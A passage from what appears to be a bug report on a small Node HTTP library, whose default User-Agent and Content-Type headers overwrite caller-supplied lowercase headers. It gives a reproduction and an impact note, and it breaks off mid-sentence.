`_read.js:36-38` looks the defaults up with exact-case keys:
`opts.headers['User-Agent'] = opts.headers['User-Agent'] || 'tiny-http'`. The outgoing
message stores headers case-insensitively, so the later assignment overwrites an existing
`user-agent` or `content-type` key and the caller's value is lost.

**Evidence:** Reproduced with Node v24.22.2: `_read({url, headers:{'content-type':'text/plain',
'user-agent':'mine'}})` arrives at the server as `{"content-type":"application/json",
"user-agent":"tiny-http"}` — both caller values discarded. Canonically cased keys work.

**Impact:** Clients that follow the common lowercase-header convention cannot set these
two headers on a GET; the server sees the library's defaults instead. Contained to the
